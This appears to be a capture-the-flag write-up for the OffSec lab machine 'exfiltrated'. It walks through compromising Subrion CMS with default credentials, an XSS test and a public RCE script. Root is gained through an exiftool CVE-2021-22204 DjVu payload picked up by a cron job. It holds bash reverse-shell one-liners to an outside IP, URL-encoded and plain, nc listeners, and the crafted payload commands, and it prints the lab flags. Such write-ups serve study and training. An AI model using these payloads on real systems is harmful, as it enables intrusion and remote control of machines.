## Recon

### Nmap
Starting off with recon I used the following scan.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -sT -vvvv -T5 -p- 192.168.221.163
Nmap scan report for 192.168.221.163

```

Since this scan did not give me the info I was looking for I scanned it again specifying these ports:

```bash

From here I added the `exfiltrated.offsec` host to my `/etc/hosts` file for further usage.

### dirsearch
I ran `dirsearch` to enumerate any other available endpoints before proceeding to the site and got 1:

```bash

I'll have to keep this is mind.


### 80/TCP - HTTP

Heading into the site I scrolled down a bit and found the following button which I clicked:

![](../../../assets/cbfc4b9fdf59dd6f6be7ea2098454e05.png)

I then got the following screen:

![](../../../assets/4df7855d0852a036e733418012ddc006.png)

I took note of the version and looked it up on `Google` using the following dork:

![](../../../assets/bab62e9f04924108e53ff0aac82d9010.png)

It appears there's multiple vulnerabilities, let's check and see which one is more applicable to us.

After some reading I understood that I first had to `log in` before I could execute any sort of scripts. I looked up `default credentials` and simultaneously tried the `admin - admin` creds and got access:

![](../../../assets/0ac4985244e39874a6a4b3fb935ac37f.png)


### Cross Site Scripting (XSS)
From here I clicked the gear icon and got a bit stuck, but reading the `PoC` of [another GitHub user](https://github.com/intelliants/subrion/issues/895) I managed to find the correct path where to insert a `XSS` payload. 
I headed to the `/panel/fields/add` endpoint, clicked on `Content` -> `Fields` and the following came up:

![](../../../assets/e2a8bcdfc65be1c01ea8360abc9e3423.png)

![](../../../assets/9ec36683dc9a80d5f8e477907fcac170.png)

![](../../../assets/e3b23bd60ad014444676bdd9dee98e9e.png)

After I had gotten to this point I decided to try out whether it is indeed vulnerable to `XSS` so I put in a default script in the `Title` and `Tooltip` bar:

![](../../../assets/244d9fe13f93a0493db469a6a2b4db3b.png)

![](../../../assets/b929f3224a3a70379b656ab95c542563.png)

And it indeed worked, meaning it is vulnerable to `XSS`.


### Remote Code Execution (RCE)
I tried writing up some further `XSS` but got nothing useful out of it, instead I looked at the other given exploits I had found earlier. 
I found another exploit regarding a `Remote Code Execution` script which looked promising so I decided to try it out.

![](../../../assets/e30f4db5fdfdbb1c98632b4a1bec2e77.png)

I decided to use this script to try and login using the previously found creds, `admin - admin`:

![](../../../assets/12dae3bdf28a03d3857b5248edc07079.png)

Indeed it seemed to work! Now that I got a reverse shell I could finally get to it.
Since I could basically not do anything in this shell I decided to send another reverse shell from here to myself in order to catch a connection on my own listener:

```bash
bash -c "bash -i >& /dev/tcp/192.168.45.190/1235 0>&1"
```

```bash
nc -lvnp 1234
```

Unfortunately for me that didn't seem to do the trick:

![](../../../assets/3d96495cf0d5809279c76e62d2929ee8.png)

I decided to `URL encode it` and check whether that would work.

```bash
bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.45.190/1234%200%3E%261%22
```

This time it seemed to work:

![](../../../assets/531f09044dcb45812277d2b6b39668a6.png)

Now that I had a normal shell I started enumerating the server to see what I had.
I tried to access some user home directories but had absolutely 0 luck.

```bash
www-data@exfiltrated:/home$ ls -l
ls -l
total 4
drwx--x--x 2 coaran coaran 4096 Jun 10  2021 coaran
www-data@exfiltrated:/home$ cd coaran
cd coaran
www-data@exfiltrated:/home/coaran$ ls -l
ls -l
ls: cannot open directory '.': Permission denied
```

After some looking around I noticed I had access to the `/etc/crontab` file:

```bash
www-data@exfiltrated:/etc$ cat crontab
cat crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh
#
```

I saw that every other minute there was script running in the `/opt` directory.

```bash
www-data@exfiltrated:/opt$ cat image-exif.sh
cat image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```

## Privilege Escalation

I decided to look up any vulnerabilities regarding `exiftool` since the script calls upon it. I checked the current version number:

```bash
www-data@exfiltrated:/opt$ exiftool -ver
exiftool -ver
11.88
```

And got to it.

![](../../../assets/6dec5144ffbce3c18904a1f8eb3a64d8.png)

After some scrolling I managed to [find a blog](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/) that contained what I needed:

![](../../../assets/fdd737247e33b8df4a7a7b361d5134d7.png)

By following these steps I had to execute the following commands:

```bash
# On the local machine
sudo apt install djvulibre-bin

# Create payload file with reverse shell
cat > payload
(metadata "\c${system('bash -c \"bash -i >& /dev/tcp/192.168.45.190/1235 0>&1\"')};")

# Compress the payload
bzz payload payload.bzz

# Compile the file
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
```

I then checked out whether everything was set up correctly using `exiftool` on the payload:

![](../../../assets/a11eba1ae0c254262bd40f8dda6ded45.png)

It all appeared to be correct meaning I now had to write a `config file` since this payload I'd crafted wouldn't do anything on it's own.

Here I went ahead and copied the content from the blog:

![](../../../assets/103a01ccc86126ca965c360abebc390f.png)

I then grabbed a random `.jpg` picture from the internet to insert the payload into it and updated it:

![](../../../assets/f3f6845d482a7d0d3851ad83067a1acc.png)

Now I had to start up my listener and a `python server` and upload the exploit to the target machine:

```bash
python3 -m http.server 80

nc -lvnp 1235
```

As we recall from earlier we need to upload the file to a specific destination or it won't work:

![](../../../assets/e44b7bb26b6860321eb4d42680d78e5d.png)

We head back into the directory and use `wget` to upload the file.

![](../../../assets/f52b6854dcd07a7576fdb144786b820b.png)

After a minute passed the `cron` job did it's thing and I got a `root shell`:

![](../../../assets/c83bcaf272ddbc9729a75152a7a1d6c2.png)


### proof.txt
```bash
root@exfiltrated:~# cat proof.txt
cat proof.txt
cbadcac343aae096bfa28029c3b495d9
```

### local.txt
I almost forgot about this one until I saw the progress bar only showing half, so I went back into the `coaran` user's directory and found the local flag there:

```bash
root@exfiltrated:/home/coaran# cat local.txt
cat local.txt
d0a96f5ad72c8b948a1556ce41f1523f
```
